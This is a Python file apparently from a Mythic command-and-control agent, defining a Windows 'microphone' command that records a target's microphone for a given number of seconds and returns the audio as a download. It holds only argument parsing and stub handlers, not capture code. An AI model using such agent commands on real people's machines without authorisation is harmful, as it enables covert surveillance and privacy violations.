from mythic_container.MythicCommandBase import *
import json


class MicrophoneArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="seconds", 
                type=ParameterType.Number, 
                description="Number of seconds to record",
                parameter_group_info=[ParameterGroupInfo(
                    required=True
                )]
            ),
        ]


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply the number of seconds to record the microphone")
        self.add_arg("seconds", self.command_line)

    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)

class MicrophoneCommand(CommandBase):
    cmd = "microphone"
    needs_admin = False
    help_cmd = "microphone <seconds>"
    description = "Record the microphone for X seconds, send the result as a downloaded file"
    version = 1
    supported_ui_features = []
    author = "@hegusung"
    argument_class = MicrophoneArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[ SupportedOS.Windows ],
        suggested_command=False
    )
    attackmapping = []

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
